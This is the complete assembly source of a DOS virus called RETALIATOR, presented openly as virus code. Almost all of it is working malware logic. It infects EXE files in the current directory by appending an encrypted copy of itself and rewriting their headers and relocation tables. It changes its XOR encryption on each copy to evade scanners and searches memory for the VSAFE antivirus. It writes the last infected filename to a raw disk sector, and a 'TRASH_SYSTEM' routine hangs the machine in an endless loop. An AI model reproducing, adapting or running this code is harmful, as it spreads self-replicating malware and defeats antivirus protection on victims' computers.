;DANGER! This is the source code for the RETALIATOR Computer Virus!
;
;NOTE: If you make any mods which change length, see IS_ID_THERE routine!
;
        .SEQ                       ;segments must appear in sequential order


;GROUP  GROUP   HOSTSEG,HSTACK     ;Host stack and code segments grouped together

;HOSTSEG program code segment. The virus gains control before this routine and
;attaches itself to another EXE file. As such, the host program for this
;installer simply announces that the RETALIATOR has executed.

HOSTSEG SEGMENT BYTE
        ASSUME  CS:HOSTSEG,SS:HSTACK

PGMSTR  DB 'RETALIATOR has executed!',7,24H

HOST:
        mov     ax,cs           ;we want DS=CS here
        mov     ds,ax
        mov     dx,OFFSET PGMSTR
        mov     ah,9
        int     21H             ;display the message
        mov     ah,4CH
        mov     al,0
        int     21H             ;terminate normally
HOSTSEG ENDS


;Host program stack

STACKSIZE       EQU     100H

HSTACK  SEGMENT PARA STACK 'STACK'
        db  STACKSIZE dup (?)
HSTACK  ENDS

;************************************************************************
;The RETALIATOR virus starts here.

NUMRELS         EQU     2              ;number of relocatables in the virus

;RETALIATOR virus code segment. This gains control first, before the host.
;As this ASM file is layed out, this program will look exactly like a simple
;program that was infected by the virus.

VSEG    SEGMENT PARA
        ASSUME  CS:VSEG,DS:VSEG,SS:HSTACK

;**************************************************************************
;RETALIATOR virus main routine starts here
VIRUS:
        call    DECRYPT_0       ;decrypt the following code (0 routine is dummy)
        push    cs              ;es=ds=cs
        pop     ds
        push    cs
        pop     es
        call    FIX_RELOC       ;fix relocatables after decryption
        call    NEW_DTA         ;set up a new DTA location
        mov     ah,19H          ;make sure we're on the C: drive
        int     21H             ;this virus is dormant on any other drive
        cmp     al,2
        jnz     REL1            ;not c: so just exit
        call    SCAN_RAM        ;scan for anti-viral measures in RAM
        jz      SCANBAD         ;found one, go trash system
        call    CHK_LAST_INFECT ;check last file infected
        jz      SCANOK          ;file still infected, or missing, so continue
SCANBAD:jmp     TRASH_SYSTEM    ;file cleaned, so go trash system
SCANOK: call    FINDEXE         ;get an exe file to attack in current dir
        jc      FINISH          ;returned c - no valid file, exit
        mov     dx,OFFSET DTA1+1EH
        call    OPEN_FILE       ;save file attributes and open r/w
        call    INFECT          ;move virus code to file we found to attack
        mov     dx,OFFSET DTA1+1EH
        call    CLOSE_FILE      ;restore original file attributes and close
        call    SET_LAST_INFECT
FINISH: call    RESTORE_DTA     ;restore DTA to original value at startup

;NOTE: REL1, REL1A and REL2 must stay on even byte boundaries for FIX_RELOC

REL1:                           ;relocatable marker for host stack segment
      ;you'll need to fix the following instruction if you use A86. A
      ;kludge like mov bx,9000H should work fine. It just gets changed anyway.
        mov     bx,SEG HSTACK   ;set up host program stack segment
        cli                     ;interrupts off while changing stack
        mov     ss,bx
REL1A:                          ;marker for host stack pointer
        mov     sp,OFFSET HSTACK
        mov     es,WORD PTR [OLDDTA+2]  ;set ds=es=PSP as at start
        mov     ds,WORD PTR [OLDDTA+2]
        sti                     ;interrupts back on
REL2:                           ;relocatable marker for host code segment
        jmp     FAR PTR HOST    ;begin execution of host program

;**************************************************************************
;Decryption routines for the virus. DECRYPT_0 is a dummy for the original
;compile only. DECRYPT_1 and _2 provide two different decryption schemes
;which decrypt the virus in RAM so that the virus using DECRYPT_1 and
;using DECRYPT_2 looks completely different in a byte-wise comparison.
;The virus dynamically changes the numbers used to decrypt each time it is
;run. Although not real sophisticated, these get the job done and fool
;real rudimentary on-the-fly scanners. The virus selects one of these two
;to put at the very end of its code, and the routine remains unencrypted
;(which it must, if it is to execute).

DECRYPT_0:                      ;dummy encrypt, called on first execution only
        push    cs
        pop     ds
        call    FIX_RELOC       ;fix relocatables so second call here doesn't
        ret                     ;ruin the relocatables

;This routine uses a single byte (55H here) to xor with the virus code to
;decrypt it. See ENCRYPT for more details.
DECRYPT_1:
        mov     bx,3            ;start decrypt at offset 3
        mov     cx,OFFSET FINAL ;decrypt this many bytes
DC1L:   mov     al,cs:[bx]      ;decrypt one byte
        xor     al,55H
        mov     cs:[bx],al
        inc     bx
        loop    DC1L            ;and loop until done
        ret

;This routine uses two bytes (55H and AAH) to xor with the virus code to
;decrypt it. It also tries to look different than ENCRYPT_1 so the two will
;not share a useful common scan string. See ENCRYPT for more details.
DECRYPT_2:
        nop                     ;NOP so we can call a different location from
        push    cs              ;start of file so the call will not be unique
        pop     ds
        xor     ax,ax
        mov     si,ax
        add     si,3
DC2L:   mov     al,[si]
        xor     al,55H          ;decrypt 1st byte in 2 byte sequence
        mov     [si],al
        inc     si
        cmp     si,OFFSET FINAL
        jz      DC2R            ;exit if done
        mov     al,[si]
        xor     al,0AAH         ;decrypt 2nd byte in 2 byte sequence
        mov     [si],al
        inc     si
        cmp     si,OFFSET FINAL
        jnz     DC2L            ;loop until done
DC2R:   ret

;The following tells the virus how many bytes to move to the end of the
;virus as a decryption routine. It should be the largest of the size of
;DECRYPT_1 + 10H and DECRYPT-2
CRYPSIZE        EQU     OFFSET DC2R - OFFSET DECRYPT_2 + 5

;The following routine fixes the relocatables after decryption has scrambled
;them. It assumes they are all on even byte boundaries. If not, FR_2 must
;be fixed so that bh and bl are reversed from what they are. Relocatables must
;be fixed because when the virus replicates, it first encrypts the code, then
;inserts the relocatables (unencrypted) into the file. DOS modifies the
;relocatables to reflect the current memory location. DECRYPT will then
;scramble them. This routine straightens them out so they are right.

FIX_RELOC:
        cmp     BYTE PTR [CRYPT],1
        jz      FR_2
        mov     bl,BYTE PTR [DC1L+4]
        mov     bh,bl
        mov     ax,WORD PTR [REL1+1]
        xor     ax,bx
        mov     WORD PTR [REL1+1],ax
        mov     ax,WORD PTR [REL1A+1]
        xor     ax,bx
        mov     WORD PTR [REL1A+1],ax
        mov     ax,WORD PTR [REL2+1]
        xor     ax,bx
        mov     WORD PTR [REL2+1],ax
        mov     ax,WORD PTR [REL2+3]
        xor     ax,bx
        mov     WORD PTR [REL2+3],ax
        ret
FR_2:
        mov     bl,BYTE PTR [DC2L+3]
        mov     bh,bl
        sub     bh,55H
        add     bh,0AAH
        mov     ax,WORD PTR [REL1+1]
        xor     ax,bx
        mov     WORD PTR [REL1+1],ax
        mov     ax,WORD PTR [REL1A+1]
        xor     ax,bx
        mov     WORD PTR [REL1A+1],ax
        mov     ax,WORD PTR [REL2+1]
        xor     ax,bx
        mov     WORD PTR [REL2+1],ax
        mov     ax,WORD PTR [REL2+3]
        xor     ax,bx
        mov     WORD PTR [REL2+3],ax
        ret

;**************************************************************************
;The following is the basic encryption routine, which encrypts the virus, and
;places the selected decryption routine at the end. Then it adjusts the call
;at the start of the virus to call the decryption routine selected. Note that
;ENCRYPT copies the virus from the space where it is executing to the buffer
;CIMAGE where the encrypted virus is constructed, and written to the file it
;is to infect.

ENCRYPT:
        xor     BYTE PTR [CRYPT],1              ;this toggles between 0 & 1 to
        cmp     BYTE PTR [CRYPT],1              ;select encryption routine to
        jz      ENCRYPT_2                       ;use

;This routine uses a single byte to encrypt with, and works in combination
;with DECRYPT_1.
ENCRYPT_1:                                      ;first encryption routine
        inc     BYTE PTR [EC1+2]                ;keep changing encrypt byte
        inc     BYTE PTR [DC1L+4]               ;before each replication
        mov     si,OFFSET VIRUS
        mov     di,OFFSET CIMAGE
        mov     cx,OFFSET FINAL-OFFSET VIRUS
EC1:    lodsb
        xor     al,55H                          ;encrypt byte
        stosb
        loop    EC1                             ;and loop until done
        xor     BYTE PTR [CRYPT],1              ;reset this for this execution
        mov     si,OFFSET DECRYPT_1             ;put decrypt routine at end
        mov     cx,CRYPSIZE - 10H
        rep     movsb
        mov     BYTE PTR [CIMAGE],0E8H          ;set call to DECRYPT_1 up
        mov     WORD PTR [CIMAGE+1],OFFSET FINAL-3
        ret

;This routine uses two bytes to encrypt with, and works in combination with
;DECRYPT_2
ENCRYPT_2:
        inc     BYTE PTR [EC2+2]                ;keep changing the two bytes
        inc     BYTE PTR [EC2+6]                ;used for encryption before
        inc     BYTE PTR [DC2L+3]               ;each replication - must change
        inc     BYTE PTR [DC2L+16]              ;both ENCRYPT and DECRYPT
        mov     si,OFFSET VIRUS
        mov     di,OFFSET CIMAGE
        mov     cx,OFFSET FINAL-OFFSET VIRUS
        shr     cx,1
        inc     cx
EC2:    lodsb
        xor     al,0AAH                         ;encrypt first byte
        stosb
        lodsb
        xor     al,55H                          ;encrypt second byte
        stosb
        loop    EC2                             ;and loop until done
        xor     BYTE PTR [CRYPT],1
        mov     si,OFFSET DECRYPT_2             ;put decrypt routine at end
        mov     cx,CRYPSIZE
        rep     movsb
        mov     BYTE PTR [CIMAGE],0E8H          ;set up call to DECRYPT_2
        mov     WORD PTR [CIMAGE+1],OFFSET FINAL
        ret


;**************************************************************************
;This routine scans the RAM for anti-viral programs. The scan strings are
;set up below. It allows multiple scan strings of varying length. They must
;be located at a specific offset with respect to a segment, which is detailed
;in the scan string data record. This routine scans all of memory, from
;the top of the interrupt vector table to the bottom of the BIOS ROM at F000.
;As such it can scan for programs in low or high memory, which is important
;with DOS 5's ability to load high. This returns with Z set if a scan match
;is found

SCAN_RAM:
        push    es
        mov     si,OFFSET SCAN_STRINGS
SRLP:   lodsb                   ;get scan string length
        or      al,al           ;is it 0?
        jz      SREXNZ          ;yes - no match, end of scan strings, return nz
        xor     ah,ah
        push    ax              ;save string length
        lodsw
        mov     dx,ax           ;put string offset in dx (used to load di)
        pop     ax
        mov     bx,40H          ;start scan at segment 40H (bx loads es)
        push    si
SRLP2:  pop     si              ;inner loop, look for string at a fixed segment
        push    si              ;set up si
        mov     di,dx           ;and di
        mov     cx,ax           ;scan string size
        inc     bx              ;increment segment to scan
        mov     es,bx           ;set segment
        repz    cmpsb           ;do compare
        jnz     SRLP3           ;no string found this segment, do another
        call    DUP_CHECK       ;make sure we're not scanning the string here!
        jnz     SREX1           ;have a match - scan string found! return Z
SRLP3:  cmp     bx,0F000H       ;are we done with this string's scan?
        jnz     SRLP2           ;nope, go do another segment
        pop     si              ;scan done, clean stack
        add     si,ax
        jmp     SRLP            ;and go for next string

SREX1:  xor     al,al           ;match found - set z and exit
        pop     si
        pop     es
        ret

SREXNZ: pop     es
        mov     al,1            ;return with nz - no matches of any strings
        or      al,al
        ret

;This subroutine just makes sure that SCAN_RAM is not scanning itself. If the
;address of the search string is the same as that of the located string, this
;stops a false alert. That will happen about one out of every 16 times. This
;routine returns Z set if the two strings are in the same location
DUP_CHECK:
        push    ax
        push    bx
        push    cx
        push    dx
        sub     si,ax           ;re-initialize si
        mov     ax,bx
        mov     bx,16
        push    dx
        mul     bx
        pop     bx
        add     ax,bx
        adc     dx,0            ;now dx:ax is absolute @ of string in virus
        mov     bx,ax
        mov     cx,dx           ;move it to cx:bx
        mov     ax,ds
        mov     dx,16
        mul     dx
        add     ax,si
        adc     dx,0            ;now dx:ax is absolute @ of string found
        cmp     ax,bx           ;are they the same?
        jnz     DC1             ;no, exit with nz set
        cmp     dx,cx           ;exit with z set if there is a match
DC1:    pop     dx
        pop     cx
        pop     bx
        pop     dx
        ret

;The scan string data structure looks like this:
;       DB      LENGTH      = A single byte string length
;       DW      OFFSET      = An offset where string is located in a segment
;       DB      X,X,X...    = Scan string of length LENGTH
;
;These are used back to back, and when a string of length 0 is encountered,
;SCAN_RAM stops.
SCAN_STRINGS:
        DB      13                              ;length
        DW      0AE2H                           ;offset
        DB      46H,49H,4CH,45H,4EH,41H         ;13 byte scan string
        DB      4DH,45H,2EH,45H,58H,54H,0       ;for Central Point VSAFE, v1.0
                  ;Note this is just a name used by VSAFE, not the best string

        DB      0                               ;next record, no more strings


;**************************************************************************
;This routine checks the last infected file, whose name is stored at Cyl 0,
;Head 0, Sector 2 as an asciiz string. If the name isn't there, the file is
;infected, or missing, this routine returns with Z set. If the file does
;not appear to be infected, it returns NZ. The ID CHECK_SEC_ID is the first
;two bytes in the sector. The sector is only assumed to contain a file name
;if the ID is there. The ASCIIZ string starts at offset 2.

CHECK_SEC_ID    EQU     7834H

CHK_LAST_INFECT:
        mov     ax,0201H                        ;read the hard disk absolute
        mov     cx,2                            ;sector Cyl 0, Hd 0, Sec 2
        mov     dx,80H                          ;drive C:
        mov     bx,OFFSET CIMAGE                ;buffer for read
        int     13H
        mov     bx,OFFSET CIMAGE
        cmp     WORD PTR [bx],CHECK_SEC_ID      ;check first word for sector ID
        jnz     CLI_ZEX                         ;sector not there yet, pass OK back
        mov     dx,OFFSET CIMAGE+2              ;location of file name
        call    FILE_OK                         ;check file out
        jc      CLI_ZEX                         ;infected or error opening, OK
        mov     al,1                            ;else file not infected
        or      al,al                           ;return NZ!
        ret

CLI_ZEX:
        xor     al,al                           ;set Z and exit
        ret


;This routine writes the last infect file name to Cylider 0, Head 0, Sector 2,
;for later checking to see if the file is still infected. That file name is
;composed of the current path (since this virus does not jump directories) and
;the file name at DTA+1EH
SET_LAST_INFECT:
        mov     WORD PTR [CIMAGE],CHECK_SEC_ID  ;sector ID into sector
        mov     BYTE PTR [CIMAGE+2],'\'         ;put starting '\' in
        mov     ah,47H                          ;get current directory
        mov     dl,0
        mov     si,OFFSET CIMAGE+3              ;put it here
        int     21H
        mov     di,OFFSET CIMAGE+3
SLI1:   cmp     BYTE PTR [di],0
        jz      SLI2
        inc     di
        jmp     SLI1
SLI2:   cmp     di,OFFSET CIMAGE+3              ;no double \\ for root dir
        jz      SLI3
        mov     BYTE PTR [di],'\'               ;put ending '\' in
        inc     di
SLI3:   mov     si,OFFSET DTA1+1EH              ;put in file name of last
SLI4:   lodsb                                   ;infected file
        stosb
        or      al,al
        jnz     SLI4                            ;loop until done
        mov     ax,0301H                        ;write to hard disk absolute
        mov     cx,2                            ;sector Cyl 0, Hd 0, Sec 2
        mov     dx,80H                          ;drive C:
        mov     bx,OFFSET CIMAGE
        int     13H
        ret                                     ;all done


;**************************************************************************
;This routine trashes the hard disk in the event that anti-viral measures are
;detected.

;This is JUST A DEMO. NO DAMAGE WILL BE DONE. It only READS the disk real fast.

TRASH_SYSTEM:
        mov     dx,OFFSET TRASH_MSG             ;display a nasty message
        mov     ah,9
        int     21H
        mov     si,0
TSL:    lodsb                                   ;get a random byte for
        mov     ah,al                           ;cylinder to read
        lodsb
        and     al,3
        mov     dl,80H
        mov     dh,al
        mov     ch,ah
        mov     cl,1
        mov     bx,OFFSET FINAL                 ;buffer to read into
        mov     ax,201H
        int     13H
        jmp     SHORT TSL                       ;loop forever

TRASH_MSG       DB 0DH,0AH,7,'RETALIATOR has detected resident '
                DB 'Anti-viral software. TRASHING HARD DISK!',0DH,0AH,24H

;**************************************************************************
;This function searches the current directory for an EXE file which passes
;the test FILE_OK. This routine will return the name of the EXE file
;in the DTA, and the c flag reset, if it is successful. Otherwise, it
;will return with the c flag set. It will search the entire directory before
;giving up.

FINDEXE:
        mov     dx,OFFSET EXEFILE
        mov     cx,3FH          ;search first for any file
        mov     ah,4EH
        int     21H
NEXTEXE:
        or      al,al           ;is DOS return OK?
        jnz     FEC             ;no - quit with C set
        mov     dx,OFFSET DTA1+1EH  ;location of file name
        call    FILE_OK         ;yes - is this a good file to use?
        jnc     FENC            ;yes - valid file found - exit with c reset
        mov     ah,4FH
        int     21H             ;do find next
        jmp     SHORT NEXTEXE   ;and go test it for validity
FEC:    stc                     ;no valid file found, return with c set
FENC:   ret                     ;valid file found, return with nc

;**************************************************************************
;This determines whether the EXE file whose name is at ds:dx is useable. If so
;it returns nc, else it returns c
;What makes an EXE file useable?:
;              a) The signature field in the EXE header must be 'MZ'. (These
;                 are the first two bytes in the file.)
;              b) The Overlay Number field in the EXE header must be zero.
;              c) There must be room in the relocatable table for NUMRELS
;                 more relocatables without enlarging it.
;              d) The first three bytes to be executed must not be a call to
;                 either of the decryption routines.

FILE_OK:
        push    dx
        call    OPEN_FILE       ;fix attributes and open file r/w
        pop     dx
        jc      OK_END1
        push    dx
        call    GET_EXE_HEADER  ;read the EXE header into EXE_HDR
        jc      OK_END          ;error in reading the file, so quit
        call    CHECK_SIG_OVERLAY       ;is the overlay number zero?
        jc      OK_END          ;no - exit with c set
        call    REL_ROOM        ;is there room in the relocatable table?
        jc      OK_END          ;no - exit
        call    IS_ID_THERE     ;is a jump at cs:0000?
OK_END: pop     dx
        pushf
        call    CLOSE_FILE      ;and close the file
        popf
OK_END1:ret                     ;return with c set properly

;This routine returns c if signature in the EXE header is anything but
;'MZ' or the overlay number is anything but zero.
CHECK_SIG_OVERLAY:
        mov     al,'M'                  ;check the signature first
        mov     ah,'Z'
        cmp     ax,WORD PTR [EXE_HDR]
        jz      CSO_1                   ;jump if OK
        stc                             ;else set carry and exit
        ret
CSO_1:  xor     ax,ax
        sub     ax,WORD PTR [EXE_HDR+26];subtract the overlay number from 0
        ret                             ;c is set if it's anything but 0


;This function reads the 28 byte EXE file header for the open file.
;It puts the header in EXE_HDR, and returns c set if unsuccessful.
GET_EXE_HEADER:
        mov     bx,WORD PTR [HANDLE]    ;handle to bx
        mov     cx,1CH                  ;read 28 byte EXE file header
        mov     dx,OFFSET EXE_HDR       ;into this buffer
        mov     ah,3FH
        int     21H
        ret                             ;return with c set properly

;This function determines if there are at least NUMRELS openings in the
;current relocatable table in the open file. If there are, it returns with
;carry reset, otherwise it returns with carry set. The computation
;this routine does is to compare whether
;    ((Header Size * 4) + Number of Relocatables) * 4 - Start of Rel Table
;is >= than 4 * NUMRELS. If it is, then there is enough room
REL_ROOM:
        mov     ax,WORD PTR [EXE_HDR+8] ;size of header, paragraphs
        add     ax,ax
        add     ax,ax
        sub     ax,WORD PTR [EXE_HDR+6] ;number of relocatables
        add     ax,ax
        add     ax,ax
        sub     ax,WORD PTR [EXE_HDR+24] ;start of relocatable table
        cmp     ax,4*NUMRELS            ;enough room to put relocatables in?
RR_RET: ret                             ;exit with carry set properly


;This function determines whether the proper call is at CS:0000. If it is,
;it returns c set, otherwise it returns c reset.
;
;WARNING: Any changes made to the virus which change its size must update
;         the two bytes dependent on OFFSET FINAL here!!
;
IS_ID_THERE:
        mov     ax,WORD PTR [EXE_HDR+22] ;initial cs
        add     ax,WORD PTR [EXE_HDR+8]  ;header size
        mov     dx,16
        mul     dx
        mov     cx,dx
        mov     dx,ax                    ;cxdx = cs:0000 in file
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                 ;set file pointer, relative to start
        int     21H
        mov     ah,3FH
        mov     bx,WORD PTR [HANDLE]
        mov     dx,OFFSET VIDC
        mov     cx,2                     ;read 2 bytes into VIDC
        int     21H
        jc      II_RET                   ;couldn't read - bad file - return c
        mov     ax,WORD PTR [VIDC]
        cmp     al,0E8H
        clc
        jnz     II_RET
        cmp     ah,0D3H                  ;(OFFSET FINAL) MOD 256 - 3
        stc
        jz      II_RET                   ;if not, then virus is not already here
        cmp     ah,0D6H                  ;(OFFSET FINAL) MOD 256
        clc
        jnz     II_RET                   ;if not, then virus is not already here
        stc                              ;else it is probably there already
II_RET: ret

;**************************************************************************
;This routine moves the virus (this program) to the end of the EXE file
;Basically, it encrypts the code now executing and puts it in the file. Then
;it goes and adjusts the EXE file header and two relocatables in the program,
;so that it will work in the new environment. It also makes sure the virus
;starts on a paragraph boundary, and adds how many bytes are necessary to
;do that.
INFECT:
        mov     cx,WORD PTR [FSIZE+2]
        mov     dx,WORD PTR [FSIZE]
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                ;set file pointer, relative to beginning
        int     21H                     ;go to end of file
        call    SETBDY                  ;lengthen to a paragraph boundary

        call    ENCRYPT                 ;encrypt the code and move it
        mov     cx,OFFSET FINAL
        add     cx,CRYPSIZE             ;last byte of code
        mov     dx,OFFSET CIMAGE        ;first byte of code, DS:DX
        mov     bx,WORD PTR [HANDLE]    ;move virus code to end of file under
        mov     ah,40H                  ;attack with DOS write function
        int     21H

        mov     dx,WORD PTR [FSIZE]     ;find 1st relocatable in code (SS)
        mov     cx,WORD PTR [FSIZE+2]
        mov     bx,OFFSET REL1          ;it is at FSIZE+REL1+1 in the file
        inc     bx
        add     dx,bx
        mov     bx,0
        adc     cx,bx                   ;cx:dx is that number
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                ;set file pointer to 1st relocatable
        int     21H
        mov     dx,OFFSET EXE_HDR+14    ;get correct old SS for new program
        mov     bx,WORD PTR [HANDLE]    ;from the EXE header
        mov     cx,2
        mov     ah,40H                  ;and write it to relocatable REL1+1
        int     21H
        mov     dx,WORD PTR [FSIZE]
        mov     cx,WORD PTR [FSIZE+2]
        mov     bx,OFFSET REL1A         ;put in correct old SP from EXE header
        inc     bx                      ;at FSIZE+REL1A+1
        add     dx,bx
        mov     bx,0
        adc     cx,bx                   ;cx:dx points to FSIZE+REL1A+1
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                ;set file pointer to place to write SP
        int     21H
        mov     dx,OFFSET EXE_HDR+16    ;get correct old SP for infected program
        mov     bx,WORD PTR [HANDLE]    ;from EXE header
        mov     cx,2
        mov     ah,40H                  ;and write it where it belongs
        int     21H
        mov     dx,WORD PTR [FSIZE]
        mov     cx,WORD PTR [FSIZE+2]
        mov     bx,OFFSET REL2          ;put in correct old CS:IP in program
        add     bx,1                    ;at FSIZE+REL2+1 on disk
        add     dx,bx
        mov     bx,0
        adc     cx,bx                   ;cx:dx points to FSIZE+REL2+1
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                ;set file pointer relavtive to start
        int     21H
        mov     dx,OFFSET EXE_HDR+20    ;get correct old CS:IP from EXE header
        mov     bx,WORD PTR [HANDLE]
        mov     cx,4
        mov     ah,40H                  ;and write 4 bytes to FSIZE+REL2+1
        int     21H
                                        ;done writing relocatable vectors
                                        ;so now adjust the EXE header values
        xor     cx,cx
        xor     dx,dx
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                ;set file pointer to start of file
        int     21H
        mov     ax,WORD PTR [FSIZE]     ;calculate new initial CS (the virus')
        mov     cl,4                    ;given by (FSIZE/16)-HEADER SIZE
        shr     ax,cl
        mov     bx,WORD PTR [FSIZE+2]
        and     bl,0FH
        mov     cl,4
        shl     bl,cl
        add     ah,bl
        sub     ax,WORD PTR [EXE_HDR+8] ;(exe header size, in paragraphs)
        mov     WORD PTR [EXE_HDR+22],ax;and save as initial CS
        mov     bx,OFFSET ENDBYTE       ;compute new initial SS
        add     bx,10H                  ;using the formula
        mov     cl,4                    ;SSi=(CSi + (OFFSET ENDBYTE+16)/16)
        shr     bx,cl
        add     ax,bx
        mov     WORD PTR [EXE_HDR+14],ax  ;and save it
        mov     ax,OFFSET VIRUS           ;get initial IP
        mov     WORD PTR [EXE_HDR+20],ax  ;and save it
        mov     ax,STACKSIZE              ;get initial SP
        mov     WORD PTR [EXE_HDR+16],ax  ;and save it
        mov     dx,WORD PTR [FSIZE+2]
        mov     ax,WORD PTR [FSIZE]     ;calculate new file size
        mov     bx,OFFSET FINAL
        add     bx,CRYPSIZE
        add     ax,bx
        xor     bx,bx
        adc     dx,bx                   ;put it in ax:dx
        add     ax,200H                 ;and set up the new page count
        adc     dx,bx                   ;page ct= (ax:dx+512)/512
        push    ax
        mov     cl,9
        shr     ax,cl
        mov     cl,7
        shl     dx,cl
        add     ax,dx
        mov     WORD PTR [EXE_HDR+4],ax ;and save it here
        pop     ax
        and     ax,1FFH                 ;now calculate last page size
        mov     WORD PTR [EXE_HDR+2],ax ;and put it here
        mov     ax,NUMRELS              ;adjust relocatables counter
        add     WORD PTR [EXE_HDR+6],ax
        mov     cx,1CH                  ;and save data at start of file
        mov     dx,OFFSET EXE_HDR
        mov     bx,WORD PTR [HANDLE]
        mov     ah,40H                  ;DOS write function
        int     21H
        mov     ax,WORD PTR [EXE_HDR+6] ;get number of relocatables in table
        dec     ax                      ;in order to calculate location of
        dec     ax                      ;where to add relocatables
        mov     bx,4                    ;Location= (No in table-2)*4+Table Ofs
        mul     bx
        add     ax,WORD PTR [EXE_HDR+24];table offset
        mov     bx,0
        adc     dx,bx                   ;dx:ax=end of old table in file
        mov     cx,dx
        mov     dx,ax
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                ;set file pointer to table end
        int     21H
        mov     ax,WORD PTR [EXE_HDR+22]  ;set up 2 ptrs:init CS = seg of REL1
        mov     bx,OFFSET REL1
        inc     bx                      ;offset of REL1
        mov     WORD PTR [EXE_HDR],bx   ;use EXE_HDR as a buffer to
        mov     WORD PTR [EXE_HDR+2],ax ;save relocatables in for now
        mov     ax,WORD PTR [EXE_HDR+22]  ;init CS = seg of REL2
        mov     bx,OFFSET REL2
        add     bx,3                    ;offset of REL2
        mov     WORD PTR [EXE_HDR+4],bx ;write it to buffer
        mov     WORD PTR [EXE_HDR+6],ax
        mov     cx,8                    ;and then write 8 bytes of data in file
        mov     dx,OFFSET EXE_HDR
        mov     bx,WORD PTR [HANDLE]
        mov     ah,40H                  ;DOS write function
        int     21H
        ret                             ;that's it, infection is complete!

;This routine makes sure file end is at paragraph boundary, so the virus
;can be attached with a valid CS. Assumes file pointer is at end of file.
SETBDY:
        mov     al,BYTE PTR [FSIZE]
        and     al,0FH              ;see if we have a paragraph boundary
        jz      SB_E                ;all set - exit
        mov     cx,10H              ;no - write any old bytes to even it up
        sub     cl,al               ;number of bytes to write in cx
        mov     dx,OFFSET ENDBYTE   ;set buffer up to point to end of the code
        add     WORD PTR [FSIZE],cx ;update FSIZE
        adc     WORD PTR [FSIZE+2],0
        mov     bx,WORD PTR [HANDLE]
        mov     ah,40H              ;DOS write function
        int     21H
SB_E:   ret

;**************************************************************************
;This routine sets up the new DTA location at DTA1, and saves the location of
;the initial DTA in the variable OLDDTA.
NEW_DTA:
        mov     ah,2FH                  ;get current DTA in ES:BX
        int     21H
        mov     WORD PTR [OLDDTA],bx    ;save it here
        mov     ax,es
        mov     WORD PTR [OLDDTA+2],ax
        mov     ax,cs
        mov     es,ax                   ;set up ES
        mov     dx,OFFSET DTA1          ;set new DTA offset
        mov     ah,1AH
        int     21H                     ;and tell DOS where we want it
        ret

;**************************************************************************
;This routine reverses the action of NEW_DTA and restores the DTA to its
;original value.
RESTORE_DTA:
        mov     dx,WORD PTR [OLDDTA]    ;get original DTA seg:ofs
        mov     ax,WORD PTR [OLDDTA+2]
        mov     ds,ax
        mov     ah,1AH
        int     21H                     ;and tell DOS where to put it
        mov     ax,cs                   ;restore ds before exiting
        mov     ds,ax
        ret

;**************************************************************************
;This routine saves the original file attribute in FATTR and the file size
;in FSIZE. It also sets the file attribute to read/write, and leaves the
;file opened in read/write mode (since it has to open the file to get the
;size), with the handle it was opened under in HANDLE. The file path and
;name is at ds:dx when called.
OPEN_FILE:
        push    dx
        mov     ah,43H          ;get file attr
        mov     al,0
        int     21H
        mov     BYTE PTR [FATTR],cl      ;save it here
        mov     ah,43H          ;now set file attr to r/w
        mov     al,1
        pop     dx
        push    dx
        mov     cl,0
        int     21H
        pop     dx
        mov     al,2
        mov     ah,3DH          ;we can r/w access open file now
        int     21H
        mov     WORD PTR [HANDLE],ax    ;save file handle here
        mov     ax,WORD PTR [DTA1+28]   ;file size was set up here by
        mov     WORD PTR [FSIZE+2],ax   ;search routine
        mov     ax,WORD PTR [DTA1+26]   ;so move it to FSIZE
        mov     WORD PTR [FSIZE],ax
        ret

;**************************************************************************
;Restore file attribute to what it was before it was infected. This also
;closes the file. The file name must be passed in a pointer ds:dx in order
;to reset the attribute properly.
CLOSE_FILE:
        push    dx
        mov     ah,3EH
        mov     bx,WORD PTR [HANDLE]
        int     21H             ;close file
        pop     dx
        mov     cl,BYTE PTR [FATTR]
        xor     ch,ch
        mov     ah,43H          ;Set file attr to old value
        mov     al,1
        int     21H
        ret

;**************************************************************************
;data storage area comes here
CRYPT   DB      0               ;flag to determine which encryption routine used
OLDDTA  DD      0               ;old DTA segment and offset
DTA1    DB      2BH dup (?)     ;new disk transfer area
EXE_HDR DB      1CH dup (?)     ;buffer for EXE file header
EXEFILE DB      '*.EXE',0       ;search string for an exe file
HANDLE  DW      0               ;file handle
FSIZE   DD      0               ;file size storage area
FATTR   DB      0               ;file attribute storage area
VIDC    DW      0               ;storage area to put two bytes for checking in

FINAL:                                  ;last byte of code in the virus

CSIZE   EQU     OFFSET FINAL - OFFSET VIRUS     ;size of code + data

CIMAGE  DB      CSIZE + CRYPSIZE dup (?);area to write encrypted virus to

ENDBYTE:                        ;stack goes out past here

VSEG    ENDS

        END VIRUS               ;Entry point is the virus
        